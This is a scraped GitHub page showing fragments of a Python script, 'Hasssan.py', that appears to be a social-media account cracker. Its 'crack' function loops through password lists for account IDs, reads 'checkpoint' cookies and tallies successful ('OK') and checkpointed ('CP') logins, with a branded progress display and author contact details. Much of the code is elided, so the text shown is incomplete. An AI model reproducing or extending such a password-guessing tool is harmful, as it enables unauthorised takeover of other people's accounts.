...
Settings
 main 
HASSAN/Hasssan.py / Jump to 
Go to file
@zuraain-khan
zuraain-khan Add files via upload
Latest commit 981cffe yesterday
 History
 1 contributor
1053 lines (1031 sloc)  45.2 KB
RawBlame
...
AUTHOR          => Hassan Khan
GITHUB          => Shah Hassan Khanzada 
WHATSAAP        => 03449195155 
 '''
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}HASSAN-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ✨ HASSAN = CHECKPOINT ✨ [red]'))
				...
				cetak(nel('[green]      ❤️✨ HASSAN = OK ❤️✨[green]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='HASSAN - XD OK'))
					ok+=1
					break
